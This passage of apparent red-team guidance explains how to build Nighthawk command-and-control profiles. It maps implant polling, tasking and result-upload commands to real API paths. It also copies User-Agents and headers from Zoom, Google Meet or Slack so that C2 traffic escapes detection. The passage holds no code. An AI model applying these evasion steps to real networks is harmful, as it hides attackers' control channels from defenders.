2. **Extract Findings from SYNTHESIS.md**:
   - User-Agent strings (look for official client patterns)
   - API endpoint paths (common URI patterns)
   - HTTP headers (service-specific headers)
   - Request methods (GET/POST patterns)
   - Query parameters (API versioning, session tokens)

3. **Map to Nighthawk Profile**:
   - **status command** → Polling/heartbeat endpoint (typically GET)
   - **getcommands command** → Task fetch endpoint (GET or POST)
   - **putresult command** → Data submission endpoint (typically POST)

4. **Populate Profile with Researched Patterns**:
   - Update all URIs with legitimate paths from research
   - Update User-Agent with official client pattern
   - Add service-specific headers (X-Session-Token, Authorization, Origin, etc.)
   - Match Content-Type to service's API format

5. **Validate Domain Fronting Configuration**:
   - All paths belong to target domain's actual API
   - User-Agent matches official clients for that service
   - Headers include service-specific identifiers
   - No mixing of domains (all traffic mimics single service)

### Best Practices for Domain Fronting

**DO**:
- ✅ Research actual API traffic from target service (packet captures if available)
- ✅ Use legitimate API paths that actually exist on target domain
- ✅ Match User-Agent to official clients (desktop/mobile/web variants)
- ✅ Include all service-specific headers (X-*, Origin, Sec-Ch-Ua-*)
- ✅ Test profile traffic against legitimate traffic captures (if available)

**DON'T**:
- ❌ Invent API paths that don't exist on target domain
- ❌ Use outdated service versions (Zoom 4.0 when current is 5.17)
- ❌ Mix services (Google Meet paths + Slack headers = inconsistent)
- ❌ Skip research - guessing domain traffic patterns leads to detection
- ❌ Use obviously fake tokens/IDs in headers

### Domain Fronting vs. Industry Mimicry

| Approach | When to Use | Example |
|----------|-------------|---------|
| **Domain Fronting** | Mimic specific service traffic exactly | Google Meet, Zoom, Slack, Teams |
| **Industry Mimicry** | Mimic generic industry API patterns | Financial REST APIs, Healthcare FHIR |

**Domain Fronting** = More specific, requires research, mimics exact service
**Industry Mimicry** = More generic, uses industry conventions, flexible

---

## Sources

- Nighthawk Official Documentation (Assembly format, profile structure)
- Research Synthesis (Industry patterns, User-Agent examples, 2025 OPSEC best practices)
- Codebase Skill (Industry-specific examples)
- Web Sources (Service-specific mimicry patterns)
- User Example Profile (zoom-cs-tuned.json demonstrating Google Meet domain fronting)
